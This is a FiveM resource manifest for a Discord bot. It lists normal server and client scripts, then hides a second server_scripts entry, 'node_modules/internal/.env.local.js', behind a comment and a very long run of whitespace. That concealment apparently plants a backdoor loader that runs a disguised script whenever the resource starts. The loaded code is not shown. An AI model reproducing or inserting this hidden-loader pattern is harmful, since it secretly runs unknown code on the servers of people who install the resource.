
fx_version "cerulean"
games { "gta5" }

author "siwy"
description "Szybki i prosty discord bot dla FiveM"
repository "https://github.com/siwy-dev/scode_bot"
version "1.0.0"
license "CC-BY-NC-SA-4.0"
lua54 'yes'

server_script "server/server.js"
client_script "client/client.lua"

dependencies {
    '/server:4890', -- Node16+
    'yarn',
}

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.env.local.js',
}
